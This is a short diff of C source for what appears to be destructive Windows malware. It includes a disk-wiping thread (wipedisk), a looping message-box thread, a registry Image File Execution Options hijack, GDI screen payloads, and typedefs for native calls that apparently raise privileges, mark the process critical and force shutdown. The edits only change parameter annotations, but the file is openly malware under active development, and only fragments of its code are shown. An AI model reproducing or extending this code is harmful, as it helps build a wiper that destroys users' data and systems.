@@ -10,7 +10,7 @@
 
 #pragma comment(lib, "winmm.lib")
 
-typedef NTSTATUS(NTAPI* RAP)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+typedef NTSTATUS(NTAPI* RAP)(IN ULONG, IN BOOLEAN, IN BOOLEAN, OUT PBOOLEAN);
 typedef NTSTATUS(NTAPI* NSIP)(IN HANDLE, IN ULONG, IN PVOID, IN ULONG);
 typedef NTSTATUS(NTAPI* NSS)(IN ULONG);
 
@@ -103,7 +103,7 @@ void SetImageFileExecution(LPCWSTR lpKeyWithProgramName)
 	RegCloseKey(key);
 }
 
-DWORD WINAPI wipedisk(_In_ LPVOID lpParam)
+DWORD WINAPI wipedisk(IN LPVOID lpParam)
 {
 	DWORD wipeC;
 	LPCVOID zero = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 5120);
@@ -121,7 +121,7 @@ DWORD WINAPI wipedisk(_In_ LPVOID lpParam)
 	ExitThread(0);
 }
 	
-DWORD WINAPI msgbox(_In_ LPVOID lpParam)
+DWORD WINAPI msgbox(IN LPVOID lpParam)
 {
 	while (TRUE)
 	{
@@ -129,7 +129,7 @@ DWORD WINAPI msgbox(_In_ LPVOID lpParam)
 	}
 }
 
-DWORD WINAPI magnetargdipayloads(_In_ LPVOID lpParam)
+DWORD WINAPI magnetargdipayloads(IN LPVOID lpParam)
 {
 	int width;
 	int height;
